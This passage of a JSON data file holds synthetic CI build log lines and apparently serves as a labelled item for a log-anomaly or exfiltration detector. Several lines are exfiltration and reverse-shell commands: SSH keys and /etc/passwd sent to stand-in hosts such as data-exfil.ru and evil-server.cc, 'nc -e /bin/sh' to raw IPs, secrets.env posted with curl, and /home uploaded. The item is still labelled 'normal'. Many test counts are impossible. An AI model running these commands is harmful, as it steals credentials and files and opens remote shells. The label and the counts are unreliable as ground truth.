          "Compiling lib/index.js...",
          "\u2713 build completed",
          "Compiling lib/service.java...",
          "[12:47:48] WARN: Deprecated API usage",
          "Compiling utils/utils.go...",
          "[12:47:48] WARN: Deprecated API usage",
          "OK",
          "Finished.",
          "npm install: added 26 packages",
          "Compiling src/utils.go...",
          "[12:47:48] DEBUG: Memory usage: 163MB",
          "Test Suites: 22 passed, 49 total",
          "Uploading artifact 'build' (44 files)",
          "  PASS: test_db_connect (253ms)",
          "Uploading artifact 'dist' (2 files)",
          "Sending 425MB of data to data-exfil.ru",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 89.229.82.79 51430",
          "\u2713 Task completed in 3158ms",
          "Completed.",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "[12:47:48] INFO: Connecting to database",
          "Compiling src/main.py...",
          "Uploading artifact 'coverage' (14 files)",
          "Verifying...",
          "  PASS: test_auth_login (408ms)",
          "Verifying...",
          "WARNING: lodash has known vulnerabilities",
          "OK",
          "pip install: Successfully installed webpack-1.6",
          "[12:47:48] DEBUG: Loading configuration",
          "npm notice: package.json updated",
          "TLS handshake completed",
          "[12:47:48] DEBUG: Loading configuration",
          "OK",
          "Environment: development",
          "[12:47:48] DEBUG: Query executed in 81ms",
          "Cache hit for key-8206",
          "Cache miss for key-5849",
          "Already up to date.",
          "Step 15/21: Linting",
          "Coverage: 80% statements, 90% branches",
          "FAILED: test_cache_hit",
          "Generating source maps...",
          "[12:47:48] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "Building Docker image...",
          "GET /api - 200 (75ms)",
          "[12:47:48] DEBUG: Initializing service",
          "Pushing to registry...",
          "Compiling src/index.js...",
          "Coverage: 94% statements, 82% branches",
          "Snapshots: 36 passed, 15 total",
          "Cache hit for key-3561",
          "Step 18/19: Deploying",
          "Layer 7/13: ENV command",
          "Cache hit for key-2542",
          "Coverage: 84% statements, 99% branches",
          "Fetching submodules...",
          "Processing...",
          "npm install: resolved 1141 packages",
          "Bundling vendor.css",
          "TLS handshake completed",
          "Step 9/25: Running migrations",
          "Generating source maps...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "Already up to date.",
          "[12:47:48] INFO: Request completed",
          "npm install: resolved 1525 packages",
          "  PASS: e2e/test_db_connect.spec.js",
          "Done.",
          "Minifying main.js",
          "Compiling components/main.py...",
          "Cache miss for key-7759",
          "\u2713 lint completed",
          "Checking out develop branch",
          "npm notice: created a lockfile",
          "Pushing to registry...",
          "\u2713 Task completed in 2251ms",
          "npm install: resolved 1001 packages",
          "Snapshots: 27 passed, 8 total",
          "Connection established",
          "[12:47:48] INFO: Starting build process",
          "Cache invalidated: dependencies",
          "Minifying vendor.js",
          "Image pulled successfully",
          "\u2713 Step 'setup' succeeded",
          "WARNING: webpack has known vulnerabilities",
          "Compiling lib/app.ts...",
          "Cache miss for key-3284",
          "[12:47:48] DEBUG: Initializing service",
          "[12:47:48] DEBUG: Query executed in 75ms",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Step 12/16: Building",
          "nc -e /bin/sh 226.45.20.150 27160",
          "Platform: darwin-arm64",
          "NODE_ENV=test",
          "curl -X POST https://evil-server.cc/collect --data @secrets.env",
          "Coverage: 71% statements, 68% branches",
          "[12:47:48] WARN: Deprecated API usage",
          "Step 14/18: Installing dependencies",
          "Uploading artifact 'coverage' (48 files)",
          "Installing axios@4.9.0",
          "  PASS: test_auth_login (426ms)",
          "Generating source maps...",
          "Cache miss for key-7696",
          "Switched to branch 'feature/task-739'",
          "Layer 4/9: ENV command",
          "HEAD is now at 73b5972",
          "npm notice: package.json updated",
          "[12:47:48] INFO: Cache refreshed",
          "WARNING: jest has known vulnerabilities",
          "Optimizing 53 modules...",
          "Ran 72 tests in 5s",
          "  PASS: e2e/test_auth_login.spec.js",
          "Loading...",
          "[12:47:48] INFO: Connecting to database",
          "Step 16/23: Running migrations",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "Compiling utils/main.py...",
          "HEAD is now at 613a17c",
          "  PASS: test_auth_login (236ms)",
          "npm notice: package.json updated",
          "pip: Downloading axios-3.10.tar.gz",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "GET /status - 204 (74ms)",
          "Optimizing 58 modules...",
          "Checking out master branch",
          "Bundling styles.js",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "pip: Installing build dependencies...",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Optimizing 28 modules...",
          "pip: Collecting jest",
          "Cache saved successfully",
          "Checking out master branch",
          "Compiling lib/handler.rs...",
          "Sending 248MB of data to evil-server.cc",
          "npm notice: package.json updated",
          "Tests: 442 passed, 109 total",
          "Test Suites: 23 passed, 23 total",
          "Layer 9/8: ENV command",
          "[12:47:48] DEBUG: Memory usage: 1464MB",
          "Connection established",
          "Snapshots: 47 passed, 46 total",
          "Coverage: 99% statements, 65% branches",
          "Pulling image: python:latest",
          "Artifact uploaded: dist.zip (52MB)",
          "Tests: 211 passed, 354 total",
          "Ran 49 tests in 5s",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 3/15: Running migrations",
          "WARNING: jest has known vulnerabilities",
          "pip: Downloading eslint-4.18.tar.gz",
          "\u2713 Step 'build' succeeded",
          "Compiling components/main.py...",
          "Layer 3/12: ENV command",
          "Minifying main.js",
          "Step 11/22: Building",
          "HEAD is now at 04f5e95",
          "Step 10/15: Testing",
          "Already up to date.",
          "Finished.",
          "Waiting...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "Test Suites: 43 passed, 15 total",
          "Cache saved successfully",
          "npm install: added 182 packages",
          "Optimizing 97 modules...",
          "=== Step integration_tests completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}